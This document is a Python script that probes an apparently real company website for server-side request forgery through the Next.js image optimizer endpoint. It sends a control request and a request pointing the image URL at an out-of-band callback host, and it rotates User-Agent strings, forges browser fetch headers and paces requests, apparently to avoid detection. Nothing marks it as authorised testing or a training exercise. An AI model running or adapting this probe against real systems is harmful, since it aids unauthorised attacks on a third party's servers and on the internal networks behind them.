import requests, urllib.parse, time, random, sys
host=sys.argv[1] if len(sys.argv)>1 else "oobe51ec405f9bd.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
B="https://www.infinitycapital.bh"
real="https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
def q(u): return urllib.parse.quote(u,safe='')
paths=[
 ("ctl_real","/_next/image?url="+q(real)+"&w=828&q=75"),
 ("probe_oob","/_next/image?url="+q("http://"+host+"/p1.png")+"&w=828&q=75"),
]
res={}
for attempt in range(6):
    for name,path in paths:
        H={"User-Agent":random.choice([
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"]),
           "Accept":"image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
           "Accept-Language":"en-US,en;q=0.9","Referer":B+"/",
           "Sec-Fetch-Dest":"image","Sec-Fetch-Mode":"no-cors","Sec-Fetch-Site":"same-origin"}
        try:
            r=requests.get(B+path,headers=H,timeout=30)
            print(attempt,name,r.status_code,len(r.content),r.headers.get('content-type'))
            if r.status_code==200 and r.headers.get('content-type','').startswith('image'):
                res[name]=len(r.content)
        except Exception as e: print(attempt,name,"ERR",e)
        time.sleep(8)
print("SUMMARY",res)
